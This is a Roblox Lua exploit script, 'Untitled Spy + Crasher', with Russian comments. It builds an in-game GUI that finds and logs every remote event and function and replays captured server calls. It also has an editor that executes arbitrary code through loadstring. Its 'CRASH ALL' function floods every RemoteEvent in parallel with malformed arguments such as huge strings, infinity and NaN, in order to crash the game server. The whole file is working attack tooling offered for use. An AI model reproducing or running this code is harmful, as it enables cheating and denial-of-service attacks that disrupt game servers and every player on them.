local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

if CoreGui:FindFirstChild("UntitledSpy") then CoreGui.UntitledSpy:Destroy() end

local sg = Instance.new("ScreenGui", CoreGui)
sg.Name = "UntitledSpy"

local Main = Instance.new("Frame", sg)
Main.Size = UDim2.new(0, 780, 0, 520)
Main.Position = UDim2.new(0.5, -390, 0.5, -260)
Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
Main.Active = true
Main.Draggable = true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 14)
Instance.new("UIStroke", Main).Color = Color3.fromRGB(45, 45, 45)

local TopBar = Instance.new("Frame", Main)
TopBar.Size = UDim2.new(1, 0, 0, 35)
TopBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 14)

local Title = Instance.new("TextLabel", TopBar)
Title.Size = UDim2.new(1, -50, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.Text = "UNTITLED SPY + CRASHER"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 14
Title.BackgroundTransparency = 1
Title.TextXAlignment = "Left"

local Close = Instance.new("TextButton", TopBar)
Close.Size = UDim2.new(0, 35, 0, 35)
Close.Position = UDim2.new(1, -35, 0, 0)
Close.Text = "×"
Close.TextColor3 = Color3.fromRGB(255, 80, 80)
Close.BackgroundTransparency = 1
Close.TextSize = 28
Close.MouseButton1Click:Connect(function() sg:Destroy() end)

-- [ ТАБЫ ]
local TabContainer = Instance.new("Frame", Main)
TabContainer.Size = UDim2.new(0, 385, 0, 35)
TabContainer.Position = UDim2.new(0, 280, 0, 45)
TabContainer.BackgroundTransparency = 1

local TabScroll = Instance.new("ScrollingFrame", TabContainer)
TabScroll.Size = UDim2.new(1, -40, 1, 0)
TabScroll.BackgroundTransparency = 1
TabScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
TabScroll.ScrollBarThickness = 0
TabScroll.AutomaticCanvasSize = Enum.AutomaticSize.X
local TabListLayout = Instance.new("UIListLayout", TabScroll)
TabListLayout.FillDirection = Enum.FillDirection.Horizontal
TabListLayout.Padding = UDim.new(0, 6)

local AddTab = Instance.new("TextButton", TabContainer)
AddTab.Size = UDim2.new(0, 28, 0, 28)
AddTab.Position = UDim2.new(1, -30, 0, 2)
AddTab.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
AddTab.Text = "+"
AddTab.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", AddTab).CornerRadius = UDim.new(0, 8)

local editors = {}
local activeTab = nil
local tabCount = 0

local function createTab(name, defaultText)
    tabCount = tabCount + 1
    local tabBtnFrame = Instance.new("Frame", TabScroll)
    tabBtnFrame.Size = UDim2.new(0, 115, 0, 30)
    tabBtnFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Instance.new("UICorner", tabBtnFrame).CornerRadius = UDim.new(0, 8)
    
    local tabName = Instance.new("TextBox", tabBtnFrame)
    tabName.Size = UDim2.new(1, -35, 1, 0)
    tabName.Position = UDim2.new(0, 10, 0, 0)
    tabName.Text = name or "Script " .. tabCount
    tabName.TextColor3 = Color3.new(1,1,1); tabName.Font = "SourceSansBold"; tabName.TextSize = 12; tabName.BackgroundTransparency = 1; tabName.ClearTextOnFocus = false

    local delBtn = Instance.new("TextButton", tabBtnFrame)
    delBtn.Size = UDim2.new(0, 20, 0, 20); delBtn.Position = UDim2.new(1, -25, 0.5, -10)
    delBtn.Text = "×"; delBtn.TextColor3 = Color3.fromRGB(255, 80, 80); delBtn.BackgroundTransparency = 1; delBtn.TextSize = 18

    local editorScroll = Instance.new("ScrollingFrame", Main)
    editorScroll.Size = UDim2.new(0, 385, 0, 285)
    editorScroll.Position = UDim2.new(0, 280, 0, 85)
    editorScroll.BackgroundColor3 = Color3.fromRGB(3, 3, 3)
    editorScroll.BorderSizePixel = 0
    editorScroll.ScrollBarThickness = 3
    editorScroll.Visible = false
    Instance.new("UICorner", editorScroll).CornerRadius = UDim.new(0, 12)

    local editor = Instance.new("TextBox", editorScroll)
    editor.Size = UDim2.new(1, -20, 1, -20)
    editor.Position = UDim2.new(0, 10, 0, 10)
    editor.BackgroundTransparency = 1
    editor.TextColor3 = Color3.fromRGB(0, 255, 150)
    editor.MultiLine = true
    editor.Text = defaultText or "-- New Script"
    editor.Font = "Code"
    editor.TextSize = 14
    editor.ClearTextOnFocus = false
    editor.TextXAlignment = "Left"
    editor.TextYAlignment = "Top"
    editor.TextWrapped = true

    local function selectTab()
        for _, t in pairs(editors) do t.Scroll.Visible = false; t.Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20) end
        editorScroll.Visible = true; tabBtnFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35); activeTab = editor
    end

    tabName.Focused:Connect(selectTab)
    delBtn.MouseButton1Click:Connect(function() tabBtnFrame:Destroy(); editorScroll:Destroy() end)
    table.insert(editors, {Frame = tabBtnFrame, Scroll = editorScroll, Editor = editor})
    selectTab()
end

AddTab.MouseButton1Click:Connect(function() createTab() end)

local ListFrame = Instance.new("Frame", Main)
ListFrame.Size = UDim2.new(0, 255, 0, 330); ListFrame.Position = UDim2.new(0, 15, 0, 45); ListFrame.BackgroundTransparency = 1

local List = Instance.new("ScrollingFrame", ListFrame)
List.Size = UDim2.new(1, 0, 1, 0); List.BackgroundColor3 = Color3.fromRGB(12, 12, 12); List.ScrollBarThickness = 1
Instance.new("UICorner", List).CornerRadius = UDim.new(0, 12)
local listLayout = Instance.new("UIListLayout", List); listLayout.Padding = UDim.new(0, 4)
Instance.new("UIPadding", List).PaddingLeft = UDim.new(0, 6); Instance.new("UIPadding", List).PaddingTop = UDim.new(0, 6)

local Toolbar = Instance.new("Frame", Main)
Toolbar.Size = UDim2.new(0, 255, 0, 32); Toolbar.Position = UDim2.new(0, 15, 1, -115); Toolbar.BackgroundTransparency = 1

local Search = Instance.new("TextBox", Toolbar)
Search.Size = UDim2.new(0, 95, 1, 0); Search.BackgroundColor3 = Color3.fromRGB(20, 20, 20); Search.PlaceholderText = "Search..."; Search.Text = ""; Search.TextColor3 = Color3.new(1,1,1); Search.Font = "SourceSansBold"; Search.TextSize = 11
Instance.new("UICorner", Search).CornerRadius = UDim.new(0, 8)

local CopyBtn = Instance.new("TextButton", Toolbar)
CopyBtn.Size = UDim2.new(0, 40, 1, 0); CopyBtn.Position = UDim2.new(0, 100, 0, 0); CopyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50); CopyBtn.Text = "COPY"; CopyBtn.TextColor3 = Color3.new(1,1,1); CopyBtn.Font = "SourceSansBold"; CopyBtn.TextSize = 10
Instance.new("UICorner", CopyBtn).CornerRadius = UDim.new(0, 8)

local FilterBtn = Instance.new("TextButton", Toolbar)
FilterBtn.Size = UDim2.new(0, 40, 1, 0); FilterBtn.Position = UDim2.new(0, 145, 0, 0); FilterBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 35); FilterBtn.Text = "ALL"; FilterBtn.TextColor3 = Color3.new(1,1,1); FilterBtn.Font = "SourceSansBold"; FilterBtn.TextSize = 10
Instance.new("UICorner", FilterBtn).CornerRadius = UDim.new(0, 8)

local ClearBtn = Instance.new("TextButton", Toolbar)
ClearBtn.Size = UDim2.new(0, 60, 1, 0); ClearBtn.Position = UDim2.new(1, -60, 0, 0); ClearBtn.BackgroundColor3 = Color3.fromRGB(80, 25, 25); ClearBtn.Text = "CLEAR"; ClearBtn.TextColor3 = Color3.new(1,1,1); ClearBtn.Font = "SourceSansBold"; ClearBtn.TextSize = 10
Instance.new("UICorner", ClearBtn).CornerRadius = UDim.new(0, 8)

-- КНОПКА КРАША (НОВАЯ)
local CrashBtn = Instance.new("TextButton", Main)
CrashBtn.Size = UDim2.new(0, 120, 0, 32)
CrashBtn.Position = UDim2.new(1, -135, 1, -50)
CrashBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
CrashBtn.Text = "💀 CRASH ALL 💀"
CrashBtn.TextColor3 = Color3.new(1,1,1)
CrashBtn.Font = "SourceSansBold"
CrashBtn.TextSize = 12
Instance.new("UICorner", CrashBtn).CornerRadius = UDim.new(0, 8)

local currentFilter = "ALL"
local allLoggedRemotes = {} -- храним все найденные RemoteEvent

local function applyFilters()
    local q = Search.Text:lower()
    for _, btn in pairs(List:GetChildren()) do
        if btn:IsA("TextButton") then
            local t = btn:GetAttribute("RemoteType")
            local isT = (currentFilter == "ALL") or (currentFilter == "RE" and t == "RemoteEvent") or (currentFilter == "RF" and t == "RemoteFunction")
            btn.Visible = isT and btn.Text:lower():find(q)
        end
    end
    List.CanvasSize = UDim2.new(0,0,0, listLayout.AbsoluteContentSize.Y + 10)
end

FilterBtn.MouseButton1Click:Connect(function()
    currentFilter = (currentFilter == "ALL" and "RE") or (currentFilter == "RE" and "RF") or "ALL"
    FilterBtn.Text = currentFilter; applyFilters()
end)
Search:GetPropertyChangedSignal("Text"):Connect(applyFilters)
ClearBtn.MouseButton1Click:Connect(function() for _, v in pairs(List:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end allLoggedRemotes = {} end)

CopyBtn.MouseButton1Click:Connect(function() if activeTab then setclipboard(activeTab.Text) end end)

local function log(remote, args)
    -- Сохраняем remote для краша
    table.insert(allLoggedRemotes, remote)
    
    local b = Instance.new("TextButton", List)
    b.Size = UDim2.new(0.95, 0, 0, 28); b.BackgroundColor3 = Color3.fromRGB(22, 22, 22); b.Text = "  " .. remote.Name; b.TextColor3 = Color3.new(1,1,1); b.Font = "SourceSansBold"; b.TextSize = 12; b.TextXAlignment = "Left"; b.TextTruncate = "AtEnd"; b:SetAttribute("RemoteType", remote.ClassName)
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
    
    b.MouseButton1Click:Connect(function()
        local s = "local args = {\n"
        for i, v in pairs(args) do
            local val = type(v) == "string" and '"'..v..'"' or tostring(v)
            s = s .. "    ["..i.."] = "..val..",\n"
        end
        s = s .. "}\n\ngame."..remote:GetFullName()..(remote:IsA("RemoteEvent") and ":FireServer(unpack(args))" or ":InvokeServer(unpack(args))")
        if activeTab then activeTab.Text = s end
    end)
    applyFilters()
end

-- СКАНИРУЕМ ВСЕ СУЩЕСТВУЮЩИЕ RemoteEvent/RemoteFunction
local function scanExistingRemotes()
    for _, v in pairs(game:GetDescendants()) do
        pcall(function()
            if v:IsA("RemoteEvent") then
                table.insert(allLoggedRemotes, v)
                v.OnClientEvent:Connect(function(...) log(v, {...}) end)
            elseif v:IsA("RemoteFunction") then
                table.insert(allLoggedRemotes, v)
                log(v, {"Detected Function"})
            end
        end)
    end
end

scanExistingRemotes()

-- Следим за новыми
game.DescendantAdded:Connect(function(v)
    pcall(function()
        if v:IsA("RemoteEvent") then
            table.insert(allLoggedRemotes, v)
            v.OnClientEvent:Connect(function(...) log(v, {...}) end)
        elseif v:IsA("RemoteFunction") then
            table.insert(allLoggedRemotes, v)
        end
    end)
end)

-- ФУНКЦИЯ КРАША: вызывает ВСЕ найденные RemoteEvent ОДНОВРЕМЕННО
local function crashAll()
    local remotesToCrash = {}
    for _, r in ipairs(allLoggedRemotes) do
        if r:IsA("RemoteEvent") then
            table.insert(remotesToCrash, r)
        end
    end
    
    if #remotesToCrash == 0 then
        print("[CRASH] Нет RemoteEvent для краша")
        return
    end
    
    print("[CRASH] Начинаю краш " .. #remotesToCrash .. " RemoteEvent")
    
    local argsList = {
        {},
        { "" },
        { "ping" },
        { "crash" },
        { "sync" },
        { "update" },
        { "attack" },
        { 0 },
        { 1 },
        { true },
        { false },
        { nil },
        { {} },
        { { data = "crash" } },
        { string.rep("X", 5000) },
        { math.huge },
        { 0/0 }
    }
    
    for _, remote in ipairs(remotesToCrash) do
        task.spawn(function()
            for _, args in ipairs(argsList) do
                pcall(function()
                    remote:FireServer(unpack(args))
                end)
            end
            pcall(function()
                remote:FireServer()
            end)
        end)
    end
    
    CrashBtn.Text = "🔥 CRASHING 🔥"
    CrashBtn.BackgroundColor3 = Color3.fromRGB(100,0,0)
    
    task.wait(2)
    CrashBtn.Text = "💀 CRASH ALL 💀"
    CrashBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
end

CrashBtn.MouseButton1Click:Connect(crashAll)

local Exec = Instance.new("TextButton", Main)
Exec.Size = UDim2.new(1, -30, 0, 45); Exec.Position = UDim2.new(0, 15, 1, -55); Exec.BackgroundColor3 = Color3.fromRGB(30, 30, 30); Exec.Text = "EXECUTE"; Exec.TextColor3 = Color3.new(1,1,1); Exec.Font = "SourceSansBold"; Exec.TextSize = 16
Instance.new("UICorner", Exec).CornerRadius = UDim.new(0, 12)
Exec.MouseButton1Click:Connect(function() if activeTab then local f = loadstring(activeTab.Text); if f then pcall(f) end end end)

createTab("Thanks For Using!","Thanks For Using Untitled Spy + Crasher!")
createTab("Crash Script",[[
-- Вставь сюда скрипт краша или нажми красную кнопку CRASH ALL
print("Готов к крашу")
]])
